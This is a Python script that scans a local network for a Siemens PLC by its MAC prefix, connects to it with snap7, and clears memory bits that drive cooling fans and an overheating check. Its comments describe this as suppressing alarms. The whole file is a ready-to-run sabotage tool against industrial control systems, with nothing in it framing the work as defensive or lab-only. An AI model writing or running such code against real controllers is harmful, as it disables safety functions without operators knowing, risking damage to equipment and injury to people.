import snap7
from snap7.util import *
import time

def find_plc_ip(ip_range):
    """
    Scans the network to find the PLC's IP address.
    """
    from scapy.all import ARP, Ether, srp

    # Scan the IP range for active devices
    print(f"Scanning network range {ip_range} for PLC...")
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_range), timeout=2, verbose=False)

    # Check for Siemens MAC address prefix (00:1C:1D)
    for snd, rcv in ans:
        mac = rcv.src
        if mac.startswith("00:1C:1D"):
            ip = rcv.psrc
            print(f"Found Siemens PLC at IP: {ip}")
            return ip

    print("PLC not found in the specified range.")
    return None

def suppress_alarms(plc_ip):
    """
    Suppresses alarms by modifying alarm-related bits in the PLC memory.
    """
    # Connect to the PLC
    plc = snap7.client.Client()
    plc.connect(plc_ip, 0, 1)  # IP, Rack, Slot

    # Define alarm-related memory addresses (from the tag table)
    activate_fan_a = 0  # %M0.0
    activate_fan_b = 1  # %M0.1
    overheating_check = 2  # %M0.2
    tag_2 = 4  # %M0.4

    # Read the current state of the alarm bits
    mb_data = plc.read_area(snap7.types.Areas.MK, 0, 0, 1)  # Read %MB0 (8 bits)
    print(f"Initial MB0 state: {bin(get_byte(mb_data, 0))}")

    # Suppress alarms by resetting the alarm bits
    set_bool(mb_data, 0, activate_fan_a, False)  # Reset Activate_Fan_A
    set_bool(mb_data, 0, activate_fan_b, False)  # Reset Activate_Fan_B
    set_bool(mb_data, 0, overheating_check, False)  # Reset Overheating_Check
    set_bool(mb_data, 0, tag_2, False)  # Reset Tag_2

    # Write the modified state back to the PLC
    plc.write_area(snap7.types.Areas.MK, 0, 0, mb_data)
    print(f"Modified MB0 state: {bin(get_byte(mb_data, 0))}")

    # Disconnect from the PLC
    plc.disconnect()
    print("Alarm suppression completed.")

if __name__ == "__main__":
    # Specify the IP range to scan for the PLC
    ip_range = "192.168.1.0/24"

    # Find the PLC's IP address
    plc_ip = find_plc_ip(ip_range)
    if not plc_ip:
        print("PLC not found. Exiting.")
        exit(1)

    # Suppress alarms by modifying the PLC memory
    suppress_alarms(plc_ip)